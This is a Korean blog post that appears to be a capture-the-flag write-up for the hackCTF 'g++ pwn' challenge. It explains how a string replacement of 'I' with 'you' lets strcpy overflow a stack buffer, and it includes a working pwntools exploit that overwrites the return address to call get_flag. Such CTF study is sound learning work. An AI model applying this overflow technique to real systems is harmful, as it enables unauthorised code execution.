---
layout: post
title:  "[hackCTF]g++ pwn"
date:   2020-02-18
---

hackCTF pwnable 12번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```

## ida - vuln
```cpp
int vuln()
{
  int v0; // ST08_4
  const char * v1; // eax
  char s; // [esp+1Ch] [ebp-3Ch]
  char v4; // [esp+3Ch] [ebp-1Ch]
  char v5; // [esp+40h] [ebp-18h]
  char v6; // [esp+47h] [ebp-11h]
  char v7; // [esp+48h] [ebp-10h]
  char v8; // [esp+4Fh] [ebp-9h]

  printf("Tell me something about yourself: ");
  fgets(&s, 32, edata);
  std::string::operator=(&input, &s);
  std::allocator<char>::allocator(&v6);
  std::string::string(&v5, "you", &v6);
  std::allocator<char>::allocator(&v8);
  std::string::string(&v7, "I", &v8);
  replace((std::string *)&v4, (std::string *)&input, (std::string *)&v7);
  std::string::operator=(&input, &v4, v0, &v5);
  std::string::~string((std::string *)&v4);
  std::string::~string((std::string *)&v7);
  std::allocator<char>::~allocator(&v8);
  std::string::~string((std::string *)&v5);
  std::allocator<char>::~allocator(&v6);
  v1 = (const char * )std::string::c_str((std::string *)&input);
  strcpy(&s, v1); // 취약점
  return printf("So, %s\n", &s);
}
```

## ida - get_flag
```cpp
int get_flag()
{
  return system("cat flag.txt"); // flag 출력
}
```
vuln은 문자열을 입력 받아 I를 you로 치환하여 s에 저장하는 함수이다. get_flag 함수를 실행시키려면 vuln의 ret을 덮어야 한다. ret을 덮기 위해서 0x40byte가 필요하지만 fgets 함수는 32byte밖에 덮을 수 없다. vuln의 특성을 이용하여 I를 you로 치환하면 fgets 함수에서는 I지만 strcpy 함수로 s에 저장할 때는 you로 치환되므로 0x40byte를 덮을 수 있다. 이를 참고하여 payload를 작성하면 된다.

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3011)

#p.recvuntil("yourself: ")

payload = "I"*21 + "A" + p32(0x08048F0D)

p.sendline(payload)

p.interactive()
```

## 결과
![1201](https://drive.google.com/uc?id=1KEJsLXVtz5B-mJ6wJ_Iqwx7qOtAYbB4Z)
